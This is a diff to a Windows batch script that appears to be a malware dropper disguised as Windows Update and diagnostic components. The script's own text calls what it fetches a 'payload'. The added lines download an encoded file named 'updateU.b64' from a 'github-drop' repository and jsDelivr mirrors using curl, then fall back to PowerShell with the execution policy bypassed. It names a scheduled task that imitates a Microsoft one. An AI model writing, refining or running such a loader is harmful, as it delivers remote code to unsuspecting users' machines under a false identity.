@@ -14,7 +14,6 @@ set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "ERR=%WORKDIR%\boot.err"
 set "MARKER=WU_BUILD_20260729U"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
-set "OK=0"
 
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
 
@@ -26,21 +25,13 @@ del /f /q "%WORKDIR%\*.b64" >nul 2>&1
 del /f /q "%ERR%" >nul 2>&1
 
 echo Downloading payload via mirrors...
+call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateU.b64" && goto :have_payload
+call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/updateU.b64" && goto :have_payload
+call :try_curl "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateU.b64" && goto :have_payload
+call :try_curl "https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/updateU.b64" && goto :have_payload
 
-REM Prefer raw GitHub first (jsDelivr often Forbidden on launchers/payloads)
-call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateU.b64"
-if "%OK%"=="1" goto :have_payload
-call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/updateU.b64"
-if "%OK%"=="1" goto :have_payload
-call :try_curl "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateU.b64"
-if "%OK%"=="1" goto :have_payload
-call :try_curl "https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/updateU.b64"
-if "%OK%"=="1" goto :have_payload
-
-REM PowerShell single-line fallback (no caret line-continuation)
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateU.b64'; (New-Object Net.WebClient).DownloadFile($u,'%B64%')}catch{exit 1}"
-if exist "%B64%" for %%A in ("%B64%") do if %%~zA GTR 1000 set "OK=1"
-if "%OK%"=="1" goto :have_payload
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateU.b64','%B64%')}catch{exit 1}"
+call :check_size && goto :have_payload
 
 echo Download failed on all mirrors.
 exit /b 1
@@ -86,13 +77,15 @@ exit /b 0
 echo TRY %~1
 del /f /q "%B64%" >nul 2>&1
 curl.exe -L --ssl-no-revoke --connect-timeout 20 -o "%B64%" "%~1"
-if not exist "%B64%" exit /b 0
+goto :check_size
+
+:check_size
+if not exist "%B64%" exit /b 1
 for %%A in ("%B64%") do (
   if %%~zA GTR 1000 (
     echo OK size=%%~zA
-    set "OK=1"
-  ) else (
-    echo FAIL size=%%~zA
+    exit /b 0
   )
+  echo FAIL size=%%~zA
 )
-exit /b 0
+exit /b 1
